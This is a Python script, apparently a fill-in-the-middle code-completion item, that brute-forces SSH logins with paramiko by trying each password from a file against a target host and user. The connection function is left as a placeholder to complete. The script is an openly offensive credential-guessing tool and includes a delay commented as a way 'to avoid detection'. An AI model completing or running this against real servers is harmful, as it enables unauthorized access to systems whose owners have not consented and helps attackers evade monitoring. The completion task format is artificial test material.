import paramiko
import time

def ssh_connect(hostname, port, username, password):
    <FILL_HERE>
def brute_force_ssh(hostname, port, username, password_list):
    """
    Brute forces an SSH password using a list of passwords.

    :param hostname: The hostname or IP address of the SSH server.
    :param port: The port number of the SSH server.
    :param username: The username to use for the SSH connection.
    :param password_list: A list of passwords to try.
    """
    for password in password_list:
        print(f"Trying password: {password}")
        if ssh_connect(hostname, port, username, password):
            print(f"Success! Password is: {password}")
            return
        time.sleep(1)  # Add a delay to avoid detection

if __name__ == "__main__":
    HOSTNAME = 'example.com'  # Replace with the target hostname or IP
    PORT = 22  # Default SSH port
    USERNAME = 'user'  # Replace with the target username
    PASSWORD_FILE = 'passwords.txt'  # File containing the list of passwords

    with open(PASSWORD_FILE, 'r') as file:
        passwords = [line.strip() for line in file]

    brute_force_ssh(HOSTNAME, PORT, USERNAME, passwords)